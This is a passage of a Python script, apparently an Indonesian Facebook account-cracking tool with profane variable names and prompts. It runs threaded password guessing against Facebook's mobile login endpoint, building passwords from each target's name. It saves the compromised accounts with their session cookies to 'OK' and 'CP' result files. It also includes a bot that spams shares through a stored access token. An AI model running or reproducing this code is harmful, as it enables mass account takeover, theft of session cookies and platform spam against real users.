				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
				tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
		except KeyError:pass
		_id = ("%s"%(len(goblok)))
		_idx = ("%s"%(len(tolol)))
		if _id == "0" or "0" == _id:
			voa = ("Teman : %s0%s"%(U,Q))
		else:
			voa = ("Teman : %s%s%s"%(U,_id,Q))
		if _idx == "0" or "0" == _idx:
			voax = ("Pengikut : %s0%s"%(I,Q))
		else:
			voax = ("Pengikut : %s%s%s"%(I,_idx,Q))
		if voa == "" or "" == voa:pass
		else:
			print (f" |-->{O}{ml}{Q}<--|-->{C}{voa}{Q}<--|-->{voax}")
##### Lihat Hasil crack #####
	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:ijo__ = filex.split("Hasil/OK-")[1];ijo_ = (Q+" |-->"+I+"Hasil/OK-"+ijo__);print(ijo_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
			try:kuning__ = filex.split("Hasil/CP-")[1];kuning_ = (Q+" |-->"+K+"Hasil/CP-"+kuning__);print(kuning_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
	def rek(self):
		self.cekfile_crk("Hasil")
		namax=input(" |-->Nama File : ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			jalan(" |-->Maaf File Tidak DiTemukan")
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("OK")
				Ass = ("%s"%(I))
				aSs = I
			except:
				copy_ri = ("Vvip")
				Ass = ("%s"%(C))
				aSs = M
		print(" |-->Jumlah Akun :",len(fila),"\n")
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					print(f" {Q}|-->{Ass}{copy_ri}{Q}. {aSs}{user}|{pw}|{tll}{Q}")
				except:pass
				time.sleep(0.01)
		input(war+'Tekan Enter !');time.sleep(3)
		menu()
##### Check opsi akun cp #####
	def check_opsii(self):
		print(" |")
		self.cekfile_crk("Hasil")
		print(" |")
		namax=input(" |-->Nama File : ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			jalan(" |-->Maaf File Tidak Ditemukan..")
			time.sleep(2)
			self.check_opsii()
		jalan(" |-->Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detik")
		print(" |-->Total Akun Yang Check Point : %s%s%s"%(O,len(fila),Q))
		print(" |")
		print(" |")
		for memek in fila:
			kontol = memek.replace("\n","")
			titid  = kontol.split("|")
			print(" |")
			print(" |-->%s"%(kontol))
			try:crackmenu("Memek").cek_opsi_cp(titid[0], titid[1])
			except requests.exceptions.ConnectionError:pass
			except:pass
		print(" |")
		jalan(" |-->Check Akun Sudah Selesai....")
		os.sys.exit()

##### Bot Share #####
	def cept_(self, idpost):
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
		while True:
			requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(idpost)+'&access_token='+str(token))

	def share_post(self):
		try:
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			os.sys.exit(war+"Token Failed !!");time.sleep(2)
		idpostt = input(' |-->Idz Post : ')
		if idpostt in (""," "):
			jalan(' |-->Jangan Kosong...');time.sleep(2)
			self.share_post()
		try:limit = int(input(' |-->Limit Share : '))
		except:limit = 100
		try:time_delay = int(input(' |-->Waktu Delay : '))
		except:time_delay = 1
		sukkses = 0
		print(" |")
		jalan(f" |-->{O}Share Post Sedang Berjalan Harap Tunggu Hingga Selesai...{Q}")
		jalan(f" |-->{O}Silahkan Check Postingan Yang Anda Share Apakah Berjalan...{Q}")
		print(" |")
		with __Kiky__(max_workers=2) as (form):
			for t in range(limit):
				sukkses += 1
#				sys.stdout.write(f'\r |-->{Q}{O}{sukkses}{Q}.{I}Berhasil Share Post{Q} : {str(idpostt)}'),
#				sys.stdout.flush()
#				time.sleep(time_delay)
				form.submit(self.cept_, idpostt)
		jalan(" |-->Berhasil Share Link...")
		os.sys.exit()

	def menujuwa(self):
		no_wa = "6283893415477"
		url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=Report") # UBAH NOMOR HP KAMU
		subprocess.check_output(["am", "start", url_wa])


	def hide_tkn(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		try:
			cokes = open(".cookie.txt", "r").read()
		except:
			cokes = ""
		try:
			vv = ses.get("https://graph.facebook.com/me?access_token="+token)
			va = json.loads(vv.text)
		except:pass
		try:namaq = va["name"]
		except:namaq = ""
		try:ttl = va["birthday"]
		except:ttl = ""
		jalan(f""" |
 |-->Nama Facebook : {O}{namaq}{Q}
 |-->Tanggal Lahir : {O}{ttl}{Q}
 |-->Token : {II}{token}{Q}
 |-->Cookie: {U}{cokes}{Q}
 |""")



##### CRACK START #####
def header_get(): 
	return {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
def header_post(): 
	return {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
def header_mbasic(): 
	return {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
def header_post_mbasic(): 
	return {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 

class crackmenu:
	def __init__(self,isifile):
		self.id = []

	def menu_crack(self):   # METHOD AUTO PASSWROD
		print(' |')
		jalan(war+"Silahkan Pilih Metode Login !")
		print(' |')
		jalan(" |-->Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat")
		print(Q+" |-->1. Mobile V1 ");time.sleep(0.02)
		print(Q+" |-->2. Mobile V2 ");time.sleep(0.02)
		print(Q+" |-->3. Mobile V3 ("+II+"Recommended"+Q+")");time.sleep(0.02)
		print(' |')
	def menu_crack_m(self):   # METHOD MANUAL PASSWORD
		jalan(war+"Silahkan Pilih Metode Login !")
		print(' |')
		jalan(" |-->Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat")
		print(Q+" |-->1. Mobile V1 ");time.sleep(0.02)
		print(' |')

	def passmenu(self,isifile):
		try:
			self.apk = isifile
			self.id = open(self.apk).read().splitlines()
		except:print(war+'File Not Found! Try Again');time.sleep(2);menu()
		cjj = open(".paww", "w")
		print(' |')
		print(' |-->Apakah Anda Mau Menggunakan Password Manual :')
		print(' |-->Manual/Default')
		print(' |')
		zk = input(' |-->Pilih (M/D): ')
		if zk in ('m','M','Manual','manual'):
			while True:jalan(war+"Contoh Password : sayang,123456")
			pwx = input(" |-->Masukan Password : ")
			jalan("%sPassword Yang DiGunakan : %s%s"%(war,I,pwx))
			if pwx == '':jalan(war+"Isi Password Dengan Benar !!")
			elif len(pwx)<=5:jalan(war+"Password Minimal 6 Huruf !!")
			else:self.menu_crack_m()
			jm = input(war+"Pilih :")
			if jm == "":
				jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
				crackmenu(isifile).passmenu(isifile)
			elif jm == "1" or jm == "01":
				self.pro_ses()
				def mobile_n(zsc=None):
					with __Kiky__(max_workers=35) as (form):
						for uid in self.id:
							try:userid = uid.split('<=>')[0];form.submit(self.mobile_v3,userid,zsc )
							except: pass
						os.remove(self.apk);exit(war+"Done !!")

				mobile_n(pwx.split(','))
			else:jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)

		elif zk in ('d', 'D','Default','default'):
			self.menu_crack() #Pilihan Method
			jm = input(war+"Pilih :")
			if jm == "":jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)
			elif jm == "1" or jm == "01":
				self.Opsi_v1()
			elif jm == "2" or jm == "02":
				self.Opsi_v2()
			elif jm == "3" or jm == "03":
				self.Opsi_v3()
			elif jm == "4" or jm == "04":
				self.Opsi_v4()
			else:jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)
	def mobile_v1(self, user, kiky__gtg):
		global ok,cp,loop,infoong
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				session=requests.Session() 
				r = session.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_get()) 
				das={
					"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
					"uid":user,
					"flow":"login_no_pin",
					"pass":pw,
					"next":"https://developers.facebook.com/tools/debug/accesstoken/"
				}
				session.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post(), allow_redirects = False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1
			sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
			sys.stdout.flush()

	def mobile_v2(self, user, kiky__gtg):
		global ok,cp,loop,infoong
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				user_gg = pilih([
					"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
					"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
				])
				session = requests.Session()
				session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":user_gg,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1
			sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
			sys.stdout.flush()


	def mobile_v3(self, user, kiky__gtg):
		global ok,cp,loop
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				session = requests.Session()
				session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1
			sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
			sys.stdout.flush()


	def mobile_v4(self, user, kiky__gtg):
		global ok,cp,loop
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				session = requests.Session()
				h1 = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7"}
				h2 = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7"}
				t = par(r.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=h1).text,'html.parser') 
				link = t.find('form',{'id':'login_form'})
				lst = ['lsd','jazoest']
				data={}
				for x in link:
					if x.get('name') in lst:
						data.update({x.get('name'):x.get('value')})
				data={"uid":user,
				"pass":pw,
				"flow":"login_no_pin",
				"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				r.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=h2, allow_redirects = False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1
			sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
			sys.stdout.flush()


	def Opsi_v1(self):
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					zz = uname.split('<=>')
					qz = zz[1].split(" ")
					text = zz[1]
					try:sj = open(".pass", "r").read()
					except:sj = ("KOSONG")
					try:
						paw = open(".paww", "r").read().split("|")
						for n in paw:
							if len(n)>= 5:
								form.submit(self.mobile_,zz[0], n)
					except Exception as e:pass
					text = text.lower()
					kika = text.split(" ")
					pww_ = [ kika[0], kika[0]+"123", kika[0]+"1234", kika[0]+"12345", text ]
					zz = uname.split('<=>')
					form.submit(self.mobile_v1,zz[0], pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()


	def Opsi_v2(self):
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					zz = uname.split('<=>')
					qz = zz[1].split(" ")
					text = zz[1]
					try:sj = open(".pass", "r").read()
					except:sj = ("KOSONG")
					try:
						paw = open(".paww", "r").read().split("|")
						for n in paw:
							if len(n)>= 5:
								form.submit(self.mobile_,zz[0], n)
					except Exception as e:pass
					text = text.lower()
					kika = text.split(" ")
					pww_ = [ kika[0], kika[0]+"123", kika[0]+"1234", kika[0]+"12345", text ]
					zz = uname.split('<=>')
					form.submit(self.mobile_v2,zz[0], pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()

	def Opsi_v3(self):
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					zz = uname.split('<=>')
					qz = zz[1].split(" ")
					text = zz[1]
					try:sj = open(".pass", "r").read()
					except:sj = ("KOSONG")
					try:
						paw = open(".paww", "r").read().split("|")
						for n in paw:
							if len(n)>= 5:
								form.submit(self.mobile_,zz[0], n)
					except Exception as e:pass
					text = text.lower()
					kika = text.split(" ")
					pww_ = [ kika[0], kika[0]+"123", kika[0]+"1234", kika[0]+"12345", text ]
					zz = uname.split('<=>')
					form.submit(self.mobile_v3,zz[0], pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()

	def Opsi_v4(self):
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					zz = uname.split('<=>')
					qz = zz[1].split(" ")
					text = zz[1]
					try:sj = open(".pass", "r").read()
					except:sj = ("KOSONG")
					try:
						paw = open(".paww", "r").read().split("|")
						for n in paw:
							if len(n)>= 5:
								form.submit(self.mobile_,zz[0], n)
					except Exception as e:pass
					text = text.lower()
					kika = text.split(" ")
					pww_ = [ kika[0], kika[0]+"123", kika[0]+"1234", kika[0]+"12345", text ]
					zz = uname.split('<=>')
					form.submit(self.mobile_v4,zz[0], pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()


	def check_opsi(self):
#		cp.append("100046041961562|tax sdr")
		print(" |")
		jalan(" |-->Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detik")
		ask = input(f" |-->Apakah Anda Mau Lasung Check Opsi ({O}Y/n{Q}):")
		if ask in ["Y", "y"]:
			print(" |-->Total Akun Yang Check Point : %s%s%s"%(O,len(cp),Q))
			print(" |")
			print(" |")
			for memek in cp:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				print(" |")
				print(" |-->%s"%(kontol))
				try:self.cek_opsi_cp(titid[0], titid[1])
				except requests.exceptions.ConnectionError:pass
				except:pass
			print(" |")
			jalan(" |-->Check Akun Sudah Selesai....")
			os.sys.exit()
		else:os.sys.exit()
	def cek_opsi_cp(self, user, pasw):
		data = {}
		mb = ("https://mbasic.facebook.com")
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]" 
		ses = requests.Session()
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"})
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		link2=ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:data.update({i.get("name"):i.get("value")})
